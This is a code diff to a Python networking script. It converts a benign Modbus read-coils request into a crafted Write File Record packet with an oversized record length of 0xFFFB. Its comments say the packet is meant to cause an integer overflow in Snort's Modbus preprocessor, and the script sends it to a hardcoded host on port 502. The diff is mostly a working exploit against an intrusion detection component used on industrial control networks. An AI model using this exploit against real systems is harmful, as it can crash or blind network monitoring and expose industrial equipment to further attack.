@@ -5,19 +5,26 @@ import logging
 
 logging.basicConfig(level=logging.DEBUG)
 
-def send_modbus_request():
+def send_malicious_modbus_request():
     try:
-        # 創建Modbus請求
-        modbus_request = ModbusADURequest(transId=1, protoId=0, len=6, unitId=1) / ModbusPDU01ReadCoilsRequest(startAddr=0, quantity=0xFFFF)
+        # Crafting a malicious Modbus request to exploit the vulnerability
+        # This packet is designed to cause an integer overflow in Snort's Modbus preprocessor[^1^][1]
+        modbus_request = ModbusADURequest(transId=1, protoId=0, len=6, unitId=1) / ModbusPDUWriteFileRecordRequest(
+            referenceType=6,
+            fileNumber=0,
+            recordNumber=0,
+            recordLength=0xFFFB,  # Malicious length to trigger overflow
+            recordData=b'\x00' * 0xFFFB
+        )
         request_data = bytes(modbus_request)
         
-        # 使用socket發送請求
+        # Using socket to send the request
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect(('10.103.152.8', 502))
         logging.info("Connected to server.")
         
         s.send(request_data)
-        logging.debug('Sent Modbus request: %s', repr(request_data))
+        logging.debug('Sent malicious Modbus request: %s', repr(request_data))
         
         response = s.recv(1024)
         logging.debug('Received response: %s', repr(response))
@@ -31,4 +38,4 @@ def send_modbus_request():
         logging.error("Error in client communication: %s", e)
 
 if __name__ == "__main__":
-    send_modbus_request()
+    send_malicious_modbus_request()
